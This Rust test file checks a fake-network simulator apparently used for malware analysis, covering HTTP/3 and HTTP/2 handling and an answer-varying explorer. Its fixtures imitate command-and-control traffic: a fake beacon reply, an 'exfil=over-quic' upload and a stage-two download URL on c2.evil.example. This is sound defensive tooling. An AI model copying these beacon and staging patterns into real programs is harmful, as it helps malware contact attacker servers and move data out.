/// The daemon answers one exact path: proves meta.path is the bare path on every HTTP version
fn gate_rule(event: &Event) -> Option<(Vec<u8>, bool)> {
    (event.protocol == Protocol::Http && event.meta["path"] == "/gate.php" && event.meta["proxy"] == false)
        .then(|| (b"HTTP/1.1 200 OK\r\nX-C2: h3\r\n\r\ntask=sleep".to_vec(), false))
}

async fn h3_request(nucleus: &Nucleus, address: SocketAddr, method: &str, path: &str, body: &[u8]) -> (u16, Vec<(String, String)>, Vec<u8>) {
    let mut roots = rustls::RootCertStore::empty();
    roots.add(nucleus.ca.ca_der().clone()).unwrap();
    let mut tls = rustls::ClientConfig::builder_with_provider(std::sync::Arc::new(rustls::crypto::ring::default_provider()))
        .with_protocol_versions(&[&rustls::version::TLS13])
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    tls.alpn_protocols = vec![b"h3".to_vec()];
    let crypto = quinn::crypto::rustls::QuicClientConfig::try_from(tls).unwrap();
    let mut endpoint = quinn::Endpoint::client("127.0.0.1:0".parse().unwrap()).unwrap();
    endpoint.set_default_client_config(quinn::ClientConfig::new(std::sync::Arc::new(crypto)));
    let connection = endpoint.connect(address, "h3.c2.example").unwrap().await.unwrap();
    let (mut driver, mut sender) = h3::client::new(h3_quinn::Connection::new(connection)).await.unwrap();
    tokio::spawn(async move { std::future::poll_fn(|cx| driver.poll_close(cx)).await });
    let request = hyper::Request::builder().method(method).uri(format!("https://h3.c2.example{path}")).body(()).unwrap();
    let mut stream = sender.send_request(request).await.unwrap();
    if !body.is_empty() {
        stream.send_data(bytes::Bytes::copy_from_slice(body)).await.unwrap();
    }
    stream.finish().await.unwrap();
    let response = stream.recv_response().await.unwrap();
    let headers = response.headers().iter().map(|(n, v)| (n.to_string(), v.to_str().unwrap_or("").to_string())).collect();
    let mut content = Vec::new();
    while let Some(mut chunk) = stream.recv_data().await.unwrap() {
        use bytes::Buf;
        while chunk.has_remaining() {
            let part = chunk.chunk().to_vec();
            chunk.advance(part.len());
            content.extend(part);
        }
    }
    (response.status().as_u16(), headers, content)
}

#[tokio::test]
async fn serves_http3_like_the_other_versions() {
    let listeners = vec![listener("h3", Some(Protocol::Http), Transport::Udp, false), listener("https", Some(Protocol::Http), Transport::Tcp, true)];
    let nucleus = Nucleus::start("http3", fake_daemon(Duration::ZERO, gate_rule).await, &listeners).await;
    wait_connected().await;
    let h3 = nucleus.address("h3");

    let (status, _, page) = h3_request(&nucleus, h3, "GET", "/index.html", b"").await;
    assert_eq!(status, 200);
    assert!(String::from_utf8_lossy(&page).contains("FakeNet"));
    let (status, headers, body) = h3_request(&nucleus, h3, "GET", "/gate.php", b"").await;
    assert_eq!((status, body.as_slice()), (200, &b"task=sleep"[..]));
    assert!(headers.iter().any(|(n, v)| n == "x-c2" && v == "h3"));
    let (status, _, _) = h3_request(&nucleus, h3, "POST", "/upload", b"exfil=over-quic").await;
    assert_eq!(status, 200);

    // HTTP/2 to the same rule: also the bare path (it used to be the full URL)
    let tcp = TcpStream::connect(nucleus.address("https")).await.unwrap();
    let mut config = rustls::ClientConfig::builder_with_provider(std::sync::Arc::new(rustls::crypto::ring::default_provider()))
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_root_certificates({
            let mut roots = rustls::RootCertStore::empty();
            roots.add(nucleus.ca.ca_der().clone()).unwrap();
            roots
        })
        .with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let tls = tokio_rustls::TlsConnector::from(std::sync::Arc::new(config)).connect("h2.c2.example".try_into().unwrap(), tcp).await.unwrap();
    let (mut h2, connection) = h2_handshake(tls).await;
    tokio::spawn(connection);
    let response = h2.send_request(hyper::Request::get("https://h2.c2.example/gate.php").body(http_body_util::Empty::<bytes::Bytes>::new()).unwrap()).await.unwrap();
    assert_eq!(response.headers()["x-c2"], "h3");

    tokio::time::sleep(Duration::from_millis(200)).await;
    let events = nucleus.kinds("event");
    let versions: Vec<_> = events.iter().map(|e| e["meta"]["version"].as_str().unwrap_or("").to_string()).collect();
    assert!(versions.contains(&"HTTP/3.0".to_string()) && versions.contains(&"HTTP/2.0".to_string()), "{versions:?}");
    assert!(events.iter().all(|e| e["meta"]["path"].as_str().unwrap_or("/").starts_with('/')));
    let h3_event = events.iter().find(|e| e["meta"]["version"] == "HTTP/3.0").unwrap();
    assert_eq!((h3_event["transport"].as_str(), h3_event["tls"].as_bool()), (Some("udp"), Some(true)));
    let saved = events.iter().find_map(|e| e["meta"]["saved_body"].as_str()).unwrap();
    assert_eq!(std::fs::read(saved).unwrap(), b"exfil=over-quic");
}

async fn h2_handshake<S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send + 'static>(
    stream: S,
) -> (hyper::client::conn::http2::SendRequest<http_body_util::Empty<bytes::Bytes>>, impl std::future::Future<Output = ()>) {
    let (sender, connection) = hyper::client::conn::http2::handshake(hyper_util::rt::TokioExecutor::new(), hyper_util::rt::TokioIo::new(stream)).await.unwrap();
    (sender, async move {
        let _ = connection.await;
    })
}

#[tokio::test]
async fn explores_answers_the_daemon_leaves_to_the_default() {
    use fakenet_explorer::{Explorer, ExplorerConfig, Hints};
    let hints = Hints::from_binary(b"\x00download\x00task=\x00http://c2.evil.example/stage2.bin\x00");
    let config = ExplorerConfig { enabled: true, rate: 1.0, seed: 3, protocols: vec!["http".into(), "dns".into()], ..ExplorerConfig::default() };
    let templates = fakenet_explorer::templates::parse(fakenet_explorer::templates::DEFAULT_TEMPLATES).unwrap();
    let explorer = std::sync::Arc::new(Explorer::new(config, templates, hints));
    let listeners = vec![listener("http", Some(Protocol::Http), Transport::Tcp, false), listener("dns", Some(Protocol::Dns), Transport::Udp, false)];
    // The daemon scripts /gate.php only: everything else is the explorer's
    let nucleus = Nucleus::start_full("explorer", fake_daemon(Duration::ZERO, gate_rule).await, &listeners, Default::default(), Some(explorer.clone()), Default::default()).await;
    wait_connected().await;

    let mut bodies = std::collections::BTreeSet::new();
    for i in 0..12 {
        let mut stream = TcpStream::connect(nucleus.address("http")).await.unwrap();
        stream.write_all(format!("GET /poll?n={i} HTTP/1.1\r\nHost: c2.evil.example\r\nConnection: close\r\n\r\n").as_bytes()).await.unwrap();
        let mut response = Vec::new();
        stream.read_to_end(&mut response).await.unwrap();
        bodies.insert(response.split(|&b| b == b'\n').next().unwrap_or_default().to_vec());
    }
    // The analyst's rule still wins
    let mut stream = TcpStream::connect(nucleus.address("http")).await.unwrap();
    stream.write_all(b"GET /gate.php HTTP/1.1\r\nHost: c2\r\nConnection: close\r\n\r\n").await.unwrap();
    let mut gate = String::new();
    stream.read_to_string(&mut gate).await.unwrap();
    assert!(gate.ends_with("task=sleep"), "{gate}");

    tokio::time::sleep(Duration::from_millis(200)).await;
    assert!(bodies.len() >= 3, "explored answers should vary: {bodies:?}");
    let explored = nucleus.kinds("explored");
    assert!(explored.len() >= 10, "{}", explored.len());
    assert!(explored.iter().all(|e| e["template"].as_str().unwrap().starts_with("http-")));
    let decisions: Vec<_> = nucleus.kinds("decision").iter().map(|d| d["route"].as_str().unwrap_or("").to_string()).collect();
    assert!(decisions.contains(&"fake-http".to_string()) || decisions.iter().any(|r| r == "fake-http"), "{decisions:?}");
    let map = explorer.map();
    assert!(map["proposals"].as_u64().unwrap() >= 10 && map["behaviors"].as_u64().unwrap() >= 3, "{map:#}");
}
